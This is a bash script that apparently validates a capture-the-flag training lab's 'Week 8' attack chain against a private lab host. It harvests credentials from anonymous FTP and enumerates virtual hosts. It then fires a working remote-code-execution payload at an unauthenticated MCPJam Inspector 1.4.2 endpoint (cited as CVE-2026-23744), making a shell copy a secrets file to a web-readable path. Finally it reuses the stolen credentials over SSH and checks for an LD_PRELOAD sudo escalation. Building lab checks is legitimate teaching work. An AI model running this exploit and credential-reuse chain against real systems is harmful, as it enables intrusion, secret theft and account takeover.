#!/usr/bin/env bash
set -euo pipefail

target="${1:-192.168.56.80}"
script_dir="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
wordlist="${2:-$script_dir/../materials/week8/vhost-subdomains.txt}"
tmp_dir="$(mktemp -d)"
curl_timeout=(--connect-timeout 5 --max-time 15)

cleanup() {
  rm -rf -- "$tmp_dir"
}
trap cleanup EXIT

for command in curl nc sshpass ssh; do
  command -v "$command" >/dev/null || {
    printf '[FAIL] Required command is missing: %s\n' "$command" >&2
    exit 1
  }
done

test -r "$wordlist" || {
  printf '[FAIL] Virtual-host wordlist is not readable: %s\n' "$wordlist" >&2
  exit 1
}

ftp_note="$(curl "${curl_timeout[@]}" --fail --silent --show-error "ftp://${target}/pub/rocketchat-onboarding.txt")"
chat_user="$(sed -n 's/^Username: //p' <<<"$ftp_note")"
chat_password="$(sed -n 's/^Password: //p' <<<"$ftp_note")"
test -n "$chat_user" && test -n "$chat_password"
printf '[OK] Anonymous FTP reveals the chat onboarding credential.\n'

discovered_vhosts=()
while IFS= read -r label; do
  [[ -n "$label" && "$label" != \#* ]] || continue
  status="$(curl "${curl_timeout[@]}" --silent --output /dev/null --write-out '%{http_code}' \
    --header "Host: ${label}.wri.local" "http://${target}/")"
  if [[ "$status" != "404" ]]; then
    discovered_vhosts+=("$label")
  fi
done <"$wordlist"

test "${#discovered_vhosts[@]}" -eq 1
test "${discovered_vhosts[0]}" = chat
printf '[OK] Wordlist enumeration reveals only the chat virtual host.\n'

curl "${curl_timeout[@]}" --fail --silent --show-error \
  --cookie-jar "$tmp_dir/chat.cookies" \
  --header 'Host: chat.wri.local' \
  --data-urlencode "username=$chat_user" \
  --data-urlencode "password=$chat_password" \
  "http://${target}/login" >/dev/null

chat_page="$(curl "${curl_timeout[@]}" --fail --silent --show-error \
  --cookie "$tmp_dir/chat.cookies" \
  --header 'Host: chat.wri.local' \
  "http://${target}/channels/ops-briefing")"
staging_host="$(grep -Eo 'staging-[0-9a-f]{8}\.wri\.local' <<<"$chat_page" | sed -n '1p')"
test -n "$staging_host"
if grep -qx "${staging_host%%.wri.local}" "$wordlist"; then
  printf '[FAIL] The hidden staging host must not appear in the supplied wordlist.\n' >&2
  exit 1
fi
printf '[OK] Authenticated chat reveals the unlisted staging virtual host.\n'

if nc -z -w 3 "$target" 6274; then
  printf '[FAIL] TCP/6274 bypasses the virtual-host discovery chain.\n' >&2
  exit 1
fi
printf '[OK] The Inspector backend is unreachable directly on TCP/6274.\n'

inspector_page="$(curl "${curl_timeout[@]}" --fail --silent --show-error \
  --header "Host: $staging_host" "http://${target}/")"
inspector_bundle_path="$(grep -Eo '/assets/index-[^"?]+\.js' <<<"$inspector_page" | sed -n '1p')"
test -n "$inspector_bundle_path"
inspector_bundle="$(curl "${curl_timeout[@]}" --fail --silent --show-error \
  --header "Host: $staging_host" "http://${target}${inspector_bundle_path}")"
grep -q 'mcpjam-inspector",version:"1\.4\.2"' <<<"$inspector_bundle"
printf '[OK] The unauthenticated MCPJam Inspector web bundle identifies version 1.4.2.\n'

rce_status="$(curl "${curl_timeout[@]}" --silent --show-error \
  --output "$tmp_dir/rce.response" \
  --write-out '%{http_code}' \
  --header "Host: $staging_host" \
  --header 'Content-Type: application/json' \
  --data '{"serverConfig":{"command":"/bin/sh","args":["-c","rm -f /srv/wri-week8-artifacts/ops.env; cat /opt/wri-week8-services/staging/config/ops.env > /srv/wri-week8-artifacts/ops.env"],"env":{}},"serverId":"migration-audit"}' \
  "http://${target}/api/mcp/connect")"
# The spawned shell is not an MCP server, so Inspector returns a connection error
# after executing the bounded command. That 500 is the expected lab signal.
test "$rce_status" = 500

config_evidence="$(curl "${curl_timeout[@]}" --fail --silent --show-error \
  --header "Host: $staging_host" \
  "http://${target}/artifacts/ops.env")"
caseworker_user="$(grep -Eo 'CASEWORKER_USER=[A-Za-z0-9._-]+' <<<"$config_evidence" | sed -n '1s/^[^=]*=//p')"
caseworker_password="$(grep -Eo 'CASEWORKER_PASSWORD=[A-Za-z0-9!._/-]+' <<<"$config_evidence" | sed -n '1s/^[^=]*=//p')"
test -n "$caseworker_user" && test -n "$caseworker_password"
printf '[OK] CVE-2026-23744 generates the intended credential-reuse evidence.\n'

ssh_options=(
  -o ConnectTimeout=5
  -o StrictHostKeyChecking=no
  -o UserKnownHostsFile=/dev/null
  -o LogLevel=ERROR
)
user_flag="$(sshpass -p "$caseworker_password" ssh "${ssh_options[@]}" \
  "$caseworker_user@$target" 'cat ~/user.txt')"
test "$user_flag" = 'WRI{week8_user_credential_reuse_complete}'
printf '[OK] Reused credentials reach the Week 8 user flag.\n'

sudo_rules="$(sshpass -p "$caseworker_password" ssh "${ssh_options[@]}" \
  "$caseworker_user@$target" 'sudo -n -l')"
grep -q 'LD_PRELOAD' <<<"$sudo_rules"
grep -q '/usr/local/bin/week8-maintenance' <<<"$sudo_rules"
printf '[OK] The optional LD_PRELOAD privilege-escalation path is present.\n'

printf '[OK] Week 8 capstone chain verified end to end.\n'
